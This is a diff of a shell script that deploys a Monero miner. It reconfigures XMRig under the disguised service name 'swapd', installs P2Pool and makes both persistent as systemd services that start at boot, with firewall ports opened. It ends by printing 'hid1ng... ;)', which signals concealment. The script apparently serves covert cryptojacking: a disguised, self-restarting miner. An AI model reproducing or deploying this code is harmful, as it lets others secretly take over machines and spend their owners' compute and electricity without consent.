@@ -535,17 +535,27 @@ else
   sysctl -w vm.nr_hugepages=$(nproc)
 fi
 
-# ======== REMOTE MONERO NODE SETUP ========
-REMOTE_NODE="node.xmr.to:18081"  # Public remote node example
+# ======== XMRIG CONFIGURATION FOR P2POOL ========
+echo "[*] Reconfiguring XMRig for P2Pool..."
+sed -i 's/"url": *"[^"]*",/"url": "127.0.0.1:3333",/' $HOME/.swapd/config.json
+sed -i 's/"user": *"[^"]*",/"user": "x",/' $HOME/.swapd/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "x",/' $HOME/.swapd/config.json
+sed -i 's/"algo": *[^,]*,/"algo": "rx\/0",/' $HOME/.swapd/config.json
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
 
-# ======== P2POOL SETUP (NO LOCAL MONERO NODE) ========
+# ======== P2POOL INSTALLATION ========
 echo "[*] Installing P2Pool..."
-# Install to CORRECT location
+# Clean previous installations
+sudo systemctl stop p2pool 2>/dev/null
+rm -rf ~/p2pool /root/.p2pool
+
+# Download and install P2Pool
 cd /tmp
 wget https://github.com/SChernykh/p2pool/releases/download/v4.4/p2pool-v4.4-linux-x64.tar.gz
 tar -xzf p2pool-v4.4-linux-x64.tar.gz -C $HOME/
-mv "$HOME/p2pool-v4.4-linux-x64" "$HOME/.p2pool"
+mv "$HOME/p2pool-v4.4-linux-x64" "$HOME/p2pool"
 
+# ======== P2POOL SERVICE CONFIGURATION ========
 echo "[*] Creating P2Pool service..."
 cat <<EOF | sudo tee /etc/systemd/system/p2pool.service
 [Unit]
@@ -553,28 +563,34 @@ Description=P2Pool Node
 After=network.target
 
 [Service]
-ExecStart=$HOME/.p2pool/p2pool \\
-  --host $REMOTE_NODE \\
+WorkingDirectory=$HOME/p2pool
+ExecStart=$HOME/p2pool/p2pool \\
+  --host node.xmr.to \\
+  --rpc-port 18081 \\
   --wallet $WALLET \\
+  --stratum [::]:3333 \\
+  --p2p [::]:37889 \\
   --loglevel 3 \\
-  --stratum 0.0.0.0:3333 \\
-  --no-localhost
+  --light-mode
 Restart=always
+RestartSec=10
 User=$(whoami)
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-sudo systemctl daemon-reload
-sudo systemctl enable p2pool
-sudo systemctl start p2pool
+# Set permissions
+chmod +x $HOME/p2pool/p2pool
+sudo chown -R $(whoami):$(id -gn) $HOME/p2pool
 
-echo "[*] Opening P2Pool firewall ports..."
-sudo ufw allow 3333/tcp comment "Stratum Server"
+# ======== FIREWALL CONFIGURATION ========
+echo "[*] Configuring firewall..."
+sudo ufw allow 3333/tcp comment "P2Pool Stratum"
+sudo ufw allow 37889/tcp comment "P2Pool P2P"
 sudo ufw reload
 
-# ======== SERVICE DEPENDENCIES ========
+# ======== MINER SERVICE DEPENDENCY ========
 echo "[*] Updating miner service dependencies..."
 cat >/tmp/swapd.service <<EOL
 [Unit]
@@ -592,12 +608,17 @@ WantedBy=multi-user.target
 EOL
 
 sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
-sudo systemctl daemon-reload
 
-echo "[*] P2Pool deployment complete (using remote node)!"
-echo "P2Pool node: systemctl status p2pool"
-echo "Miner: systemctl status swapd"
-echo "XMRig command: ./swapd -o 127.0.0.1:3333"
+# ======== FINAL SETUP STEPS ========
+echo "[*] Starting services..."
+sudo systemctl daemon-reload
+sudo systemctl enable --now p2pool
+sudo systemctl enable --now swapd
+
+echo "[*] Verification commands:"
+echo "P2Pool status: sudo journalctl -u p2pool -f"
+echo "Miner status: sudo journalctl -u swapd -f"
+echo "Network ports: ss -tulpn | grep -E '3333|37889'"
 
 
 echo "[*] hid1ng... ;)"
